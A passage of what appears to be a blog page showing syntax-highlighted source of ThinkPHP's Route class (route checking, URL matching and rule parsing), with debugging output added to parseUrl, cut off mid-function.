class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | ThinkPHP [ WE CAN DO IT JUST THINK IT ]</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | Copyright (c) 2006-2014 http://thinkphp.cn All rights reserved.</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | Author: liu21st &lt;liu21st@gmail.com&gt;</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ThinkPHP路由解析类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Route</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 路由检测</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$depr</span>   =   <span class="title function_ invoke__">C</span>(<span class="string">&#x27;URL_PATHINFO_DEPR&#x27;</span>);</span><br><span class="line">        <span class="variable">$regx</span>   =   <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\.&#x27;</span>.__EXT__.<span class="string">&#x27;$/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">trim</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>],<span class="variable">$depr</span>));</span><br><span class="line">        <span class="comment">// 分隔符替换 确保路由定义使用统一的分隔符</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;/&#x27;</span> != <span class="variable">$depr</span>)&#123;</span><br><span class="line">            <span class="variable">$regx</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$depr</span>,<span class="string">&#x27;/&#x27;</span>,<span class="variable">$regx</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// URL映射定义（静态路由）</span></span><br><span class="line">        <span class="variable">$maps</span>   =   <span class="title function_ invoke__">C</span>(<span class="string">&#x27;URL_MAP_RULES&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$maps</span>[<span class="variable">$regx</span>])) &#123;</span><br><span class="line">            <span class="variable">$var</span>    =   <span class="built_in">self</span>::<span class="title function_ invoke__">parseUrl</span>(<span class="variable">$maps</span>[<span class="variable">$regx</span>]);</span><br><span class="line">            <span class="variable">$_GET</span>   =   <span class="title function_ invoke__">array_merge</span>(<span class="variable">$var</span>, <span class="variable">$_GET</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;                </span><br><span class="line">        &#125;        </span><br><span class="line">        <span class="comment">// 动态路由处理</span></span><br><span class="line">        <span class="variable">$routes</span> =   <span class="title function_ invoke__">C</span>(<span class="string">&#x27;URL_ROUTE_RULES&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$routes</span>)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$routes</span> <span class="keyword">as</span> <span class="variable">$rule</span>=&gt;<span class="variable">$route</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$rule</span>))&#123;</span><br><span class="line">                    <span class="comment">// 支持 array(&#x27;rule&#x27;,&#x27;adddress&#x27;,...) 定义路由</span></span><br><span class="line">                    <span class="variable">$rule</span>   =   <span class="title function_ invoke__">array_shift</span>(<span class="variable">$route</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$route</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$route</span>[<span class="number">2</span>]))&#123;</span><br><span class="line">                    <span class="comment">// 路由参数</span></span><br><span class="line">                    <span class="variable">$options</span>    =   <span class="variable">$route</span>[<span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;ext&#x27;</span>]) &amp;&amp; __EXT__ != <span class="variable">$options</span>[<span class="string">&#x27;ext&#x27;</span>])&#123;</span><br><span class="line">                        <span class="comment">// URL后缀检测</span></span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;method&#x27;</span>]) &amp;&amp; REQUEST_METHOD != <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$options</span>[<span class="string">&#x27;method&#x27;</span>]))&#123;</span><br><span class="line">                        <span class="comment">// 请求类型检测</span></span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 自定义检测</span></span><br><span class="line">                    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;callback&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_callable</span>(<span class="variable">$options</span>[<span class="string">&#x27;callback&#x27;</span>])) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="literal">false</span> === <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$options</span>[<span class="string">&#x27;callback&#x27;</span>])) &#123;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;                    </span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="number">0</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$rule</span>,<span class="string">&#x27;/&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="variable">$rule</span>,<span class="variable">$regx</span>,<span class="variable">$matches</span>)) &#123; <span class="comment">// 正则路由</span></span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$route</span> <span class="keyword">instanceof</span> \<span class="built_in">Closure</span>) &#123;</span><br><span class="line">                        <span class="comment">// 执行闭包</span></span><br><span class="line">                        <span class="variable">$result</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">invokeRegx</span>(<span class="variable">$route</span>, <span class="variable">$matches</span>);</span><br><span class="line">                        <span class="comment">// 如果返回布尔值 则继续执行</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="title function_ invoke__">is_bool</span>(<span class="variable">$result</span>) ? <span class="variable">$result</span> : <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="title function_ invoke__">parseRegex</span>(<span class="variable">$matches</span>,<span class="variable">$route</span>,<span class="variable">$regx</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123; <span class="comment">// 规则路由</span></span><br><span class="line">                    <span class="variable">$len1</span>   =   <span class="title function_ invoke__">substr_count</span>(<span class="variable">$regx</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">                    <span class="variable">$len2</span>   =   <span class="title function_ invoke__">substr_count</span>(<span class="variable">$rule</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$len1</span>&gt;=<span class="variable">$len2</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$rule</span>,<span class="string">&#x27;[&#x27;</span>)) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="string">&#x27;$&#x27;</span> == <span class="title function_ invoke__">substr</span>(<span class="variable">$rule</span>,-<span class="number">1</span>,<span class="number">1</span>)) &#123;<span class="comment">// 完整匹配</span></span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$len1</span> != <span class="variable">$len2</span>) &#123;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                                <span class="variable">$rule</span> =  <span class="title function_ invoke__">substr</span>(<span class="variable">$rule</span>,<span class="number">0</span>,-<span class="number">1</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable">$match</span>  =  <span class="built_in">self</span>::<span class="title function_ invoke__">checkUrlMatch</span>(<span class="variable">$regx</span>,<span class="variable">$rule</span>);</span><br><span class="line">                        <span class="keyword">if</span>(<span class="literal">false</span> !== <span class="variable">$match</span>)  &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$route</span> <span class="keyword">instanceof</span> \<span class="built_in">Closure</span>) &#123;</span><br><span class="line">                                <span class="comment">// 执行闭包</span></span><br><span class="line">                                <span class="variable">$result</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">invokeRule</span>(<span class="variable">$route</span>, <span class="variable">$match</span>);</span><br><span class="line">                                <span class="comment">// 如果返回布尔值 则继续执行</span></span><br><span class="line">                                <span class="keyword">return</span> <span class="title function_ invoke__">is_bool</span>(<span class="variable">$result</span>) ? <span class="variable">$result</span> : <span class="keyword">exit</span>;</span><br><span class="line">                            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="built_in">self</span>::<span class="title function_ invoke__">parseRule</span>(<span class="variable">$rule</span>,<span class="variable">$route</span>,<span class="variable">$regx</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检测URL和规则路由是否匹配</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkUrlMatch</span>(<span class="params"><span class="variable">$regx</span>,<span class="variable">$rule</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$m1</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>,<span class="variable">$regx</span>);</span><br><span class="line">        <span class="variable">$m2</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>,<span class="variable">$rule</span>);</span><br><span class="line">        <span class="variable">$var</span> = <span class="keyword">array</span>();         </span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$m2</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="number">0</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>,<span class="string">&#x27;[:&#x27;</span>))&#123;</span><br><span class="line">                <span class="variable">$val</span>    =   <span class="title function_ invoke__">substr</span>(<span class="variable">$val</span>,<span class="number">1</span>,-<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&#x27;:&#x27;</span> == <span class="title function_ invoke__">substr</span>(<span class="variable">$val</span>,<span class="number">0</span>,<span class="number">1</span>)) &#123;<span class="comment">// 动态变量</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>,<span class="string">&#x27;|&#x27;</span>))&#123;</span><br><span class="line">                    <span class="comment">// 使用函数过滤</span></span><br><span class="line">                    <span class="variable">$val</span>   =   <span class="title function_ invoke__">substr</span>(<span class="variable">$val</span>,<span class="number">1</span>,<span class="variable">$pos</span>-<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>,<span class="string">&#x27;\\&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="variable">$type</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$val</span>,-<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="string">&#x27;d&#x27;</span>==<span class="variable">$type</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m1</span>[<span class="variable">$key</span>]) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$m1</span>[<span class="variable">$key</span>]))</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$name</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$val</span>, <span class="number">1</span>, -<span class="number">2</span>);</span><br><span class="line">                &#125;<span class="keyword">elseif</span>(<span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>,<span class="string">&#x27;^&#x27;</span>))&#123;</span><br><span class="line">                    <span class="variable">$array</span>   =  <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;-&#x27;</span>,<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$val</span>,<span class="string">&#x27;^&#x27;</span>),<span class="number">1</span>));</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$m1</span>[<span class="variable">$key</span>],<span class="variable">$array</span>)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$name</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$val</span>, <span class="number">1</span>, <span class="variable">$pos</span> - <span class="number">1</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$name</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$val</span>, <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$var</span>[<span class="variable">$name</span>] = <span class="keyword">isset</span>(<span class="variable">$m1</span>[<span class="variable">$key</span>])?<span class="variable">$m1</span>[<span class="variable">$key</span>]:<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">elseif</span>(<span class="number">0</span> !== <span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$val</span>,<span class="variable">$m1</span>[<span class="variable">$key</span>]))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 成功匹配后返回URL中的动态变量数组</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$var</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析规范的路由地址</span></span><br><span class="line">    <span class="comment">// 地址格式 [控制器/操作?]参数1=值1&amp;参数2=值2...</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrl</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;-------------------------------&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$var</span>  =  <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">false</span> !== <span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>,<span class="string">&#x27;?&#x27;</span>)) &#123; <span class="comment">// [控制器/操作?]参数1=值1&amp;参数2=值2...</span></span><br><span class="line">            <span class="variable">$info</span>   =  <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">            <span class="variable">$path</span>   = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>,<span class="variable">$info</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">            <span class="title function_ invoke__">parse_str</span>(<span class="variable">$info</span>[<span class="string">&#x27;query&#x27;</span>],<span class="variable">$var</span>);</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>,<span class="string">&#x27;/&#x27;</span>))&#123; <span class="comment">// [控制器/操作]</span></span><br><span class="line">            <span class="variable">$path</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; <span class="comment">// 参数1=值1&amp;参数2=值2...</span></span><br><span class="line">            <span class="title function_ invoke__">parse_str</span>(<span class="variable">$url</span>,<span class="variable">$var</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$path</span>)) &#123;</span><br><span class="line">            <span class="variable">$var</span>[<span class="title function_ invoke__">C</span>(<span class="string">&#x27;VAR_ACTION&#x27;</span>)] = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$path</span>);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$path</span>)) &#123;</span><br><span class="line">                <span class="variable">$var</span>[<span class="title function_ invoke__">C</span>(<span class="string">&#x27;VAR_CONTROLLER&#x27;</span>)] = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$path</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$path</span>)) &#123;</span><br><span class="line">                <span class="variable">$var</span>[<span class="title function_ invoke__">C</span>(<span class="string">&#x27;VAR_MODULE&#x27;</span>)]  = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$path</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$var</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析规则路由</span></span><br><span class="line">    <span class="comment">// &#x27;路由规则&#x27;=&gt;&#x27;[控制器/操作]?额外参数1=值1&amp;额外参数2=值2...&#x27;</span></span><br><span class="line">    <span class="comment">// &#x27;路由规则&#x27;=&gt;array(&#x27;[控制器/操作]&#x27;,&#x27;额外参数1=值1&amp;额外参数2=值2...&#x27;)</span></span><br><span class="line">    <span class="comment">// &#x27;路由规则&#x27;=&gt;&#x27;外部地址&#x27;</span></span><br><span class="line">    <span class="comment">// &#x27;路由规则&#x27;=&gt;array(&#x27;外部地址&#x27;,&#x27;重定向代码&#x27;)</span></span><br><span class="line">    <span class="comment">// 路由规则中 :开头 表示动态变量</span></span><br><span class="line">    <span class="comment">// 外部地址中可以用动态变量 采用 :1 :2 的方式</span></span><br><span class="line">    <span class="comment">// &#x27;news/:month/:day/:id&#x27;=&gt;array(&#x27;News/read?cate=1&#x27;,&#x27;status=1&#x27;),</span></span><br><span class="line">    <span class="comment">// &#x27;new/:id&#x27;=&gt;array(&#x27;/new.php?id=:1&#x27;,301), 重定向</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseRule</span>(<span class="params"><span class="variable">$rule</span>,<span class="variable">$route</span>,<span class="variable">$regx</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 获取路由地址规则</span></span><br><span class="line">        <span class="variable">$url</span>   =  <span class="title function_ invoke__">is_array</span>(<span class="variable">$route</span>)?<span class="variable">$route</span>[<span class="number">0</span>]:<span class="variable">$route</span>;</span><br><span class="line">        <span class="comment">// 获取URL地址中的参数</span></span><br><span class="line">        <span class="variable">$paths</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>,<span class="variable">$regx</span>);</span><br><span class="line">        <span class="comment">// 解析路由规则</span></span><br><span class="line">        <span class="variable">$matches</span>  =  <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$rule</span> =  <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>,<span class="variable">$rule</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$rule</span> <span class="keyword">as</span> <span class="variable">$item</span>)&#123;</span><br><span class="line">            <span class="variable">$fun</span>    =   <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="number">0</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$item</span>,<span class="string">&#x27;[:&#x27;</span>))&#123;</span><br><span class="line">                <span class="variable">$item</span>   =   <span class="title function_ invoke__">substr</span>(<span class="variable">$item</span>,<span class="number">1</span>,-<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="number">0</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$item</span>,<span class="string">&#x27;:&#x27;</span>)) &#123; <span class="comment">// 动态变量获取</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$item</span>,<span class="string">&#x27;|&#x27;</span>))&#123; </span><br><span class="line">                    <span class="comment">// 支持函数过滤</span></span><br><span class="line">                    <span class="variable">$fun</span>  =  <span class="title function_ invoke__">substr</span>(<span class="variable">$item</span>,<span class="variable">$pos</span>+<span class="number">1</span>);</span><br><span class="line">                    <span class="variable">$item</span> =  <span class="title function_ invoke__">substr</span>(<span class="variable">$item</span>,<span class="number">0</span>,<span class="variable">$pos</span>);                    </span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$item</span>,<span class="string">&#x27;^&#x27;</span>) ) &#123;</span><br><span class="line">                    <span class="variable">$var</span>  =  <span class="title function_ invoke__">substr</span>(<span class="variable">$item</span>,<span class="number">1</span>,<span class="variable">$pos</span>-<span class="number">1</span>);</span><br><span class="line">                &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$item</span>,<span class="string">&#x27;\\&#x27;</span>))&#123;</span><br><span class="line">                    <span class="variable">$var</span>  =  <span class="title function_ invoke__">substr</span>(<span class="variable">$item</span>,<span class="number">1</span>,-<span class="number">2</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$var</span>  =  <span class="title function_ invoke__">substr</span>(<span class="variable">$item</span>,<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$matches</span>[<span class="variable">$var</span>] = !<span class="keyword">empty</span>(<span class="variable">$fun</span>)? <span class="variable">$fun</span>(<span class="title function_ invoke__">array_shift</span>(<span class="variable">$paths</span>)) : <span class="title function_ invoke__">array_shift</span>(<span class="variable">$paths</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; <span class="comment">// 过滤URL中的静态变量</span></span><br><span class="line">                <span class="title function_ invoke__">array_shift</span>(<span class="variable">$paths</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="number">0</span>=== <span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>,<span class="string">&#x27;/&#x27;</span>) || <span class="number">0</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>,<span class="string">&#x27;http&#x27;</span>)) &#123; <span class="comment">// 路由重定向跳转</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>,<span class="string">&#x27;:&#x27;</span>)) &#123; <span class="comment">// 传递动态参数</span></span><br><span class="line">                <span class="variable">$values</span> = <span class="title function_ invoke__">array_values</span>(<span class="variable">$matches</span>);</span><br><span class="line">                <span class="variable">$url</span> = <span class="title function_ invoke__">preg_replace_callback</span>(<span class="string">&#x27;/:(\d+)/&#x27;</span>, function(<span class="variable">$match</span>) <span class="keyword">use</span>($<span class="title">values</span>)&#123; <span class="title">return</span> $<span class="title">values</span>[$<span class="title">match</span>[1] - 1]; &#125;, <span class="variable">$url</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$url</span>&quot;</span>, <span class="literal">true</span>,(<span class="title function_ invoke__">is_array</span>(<span class="variable">$route</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$route</span>[<span class="number">1</span>]))?<span class="variable">$route</span>[<span class="number">1</span>]:<span class="number">301</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 解析路由地址</span></span><br><span class="line">            <span class="variable">$var</span>  =  <span class="built_in">self</span>::<span class="title function_ invoke__">parseUrl</span>(<span class="variable">$url</span>);</span><br><span class="line">            <span class="comment">// 解析路由地址里面的动态参数</span></span><br><span class="line">            <span class="variable">$values</span>  =  <span class="title function_ invoke__">array_values</span>(<span class="variable">$matches</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$var</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="number">0</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>,<span class="string">&#x27;:&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="variable">$var</span>[<span class="variable">$key</span>] =  <span class="variable">$values</span>[<span class="title function_ invoke__">substr</span>(<span class="variable">$val</span>,<span class="number">1</span>)-<span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$var</span>   =   <span class="title function_ invoke__">array_merge</span>(<span class="variable">$matches</span>,<span class="variable">$var</span>);</span><br><span class="line">            <span class="comment">// 解析剩余的URL参数</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$paths</span>)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">preg_replace_callback</span>(<span class="string">&#x27;/(\w+)\/([^\/]+)/&#x27;</span>, function(<span class="variable">$match</span>) <span class="keyword">use</span>(&amp;$<span class="title">var</span>)&#123; $<span class="title">var</span>[<span class="title">strtolower</span>($<span class="title">match</span>[1])]=<span class="title">strip_tags</span>($<span class="title">match</span>[2]);&#125;, <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;/&#x27;</span>,<span class="variable">$paths</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 解析路由自动传入参数</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$route</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$route</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$route</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">                    <span class="variable">$params</span>     =   <span class="variable">$route</span>[<span class="number">1</span>];</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$route</span>[<span class="number">1</span>],<span class="variable">$params</span>);</span><br><span class="line">                &#125;                </span><br><span class="line">                <span class="variable">$var</span>   =   <span class="title function_ invoke__">array_merge</span>(<span class="variable">$var</span>,<span class="variable">$params</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$_GET</span>   =  <span class="title function_ invoke__">array_merge</span>(<span class="variable">$var</span>,<span class="variable">$_GET</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析正则路由</span></span><br><span class="line">    <span class="comment">// &#x27;路由正则&#x27;=&gt;&#x27;[控制器/操作]?参数1=值1&amp;参数2=值2...&#x27;</span></span><br><span class="line">    <span class="comment">// &#x27;路由正则&#x27;=&gt;array(&#x27;[控制器/操作]?参数1=值1&amp;参数2=值2...&#x27;,&#x27;额外参数1=值1&amp;额外参数2=值2...&#x27;)</span></span><br><span class="line">    <span class="comment">// &#x27;路由正则&#x27;=&gt;&#x27;外部地址&#x27;</span></span><br><span class="line">    <span class="comment">// &#x27;路由正则&#x27;=&gt;array(&#x27;外部地址&#x27;,&#x27;重定向代码&#x27;)</span></span><br><span class="line">    <span class="comment">// 参数值和外部地址中可以用动态变量 采用 :1 :2 的方式</span></span><br><span class="line">    <span class="comment">// &#x27;/new\/(\d+)\/(\d+)/&#x27;=&gt;array(&#x27;News/read?id=:1&amp;page=:2&amp;cate=1&#x27;,&#x27;status=1&#x27;),</span></span><br><span class="line">    <span class="comment">// &#x27;/new\/(\d+)/&#x27;=&gt;array(&#x27;/new.php?id=:1&amp;page=:2&amp;status=1&#x27;,&#x27;301&#x27;), 重定向</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseRegex</span>(<span class="params"><span class="variable">$matches</span>,<span class="variable">$route</span>,<span class="variable">$regx</span></span>) 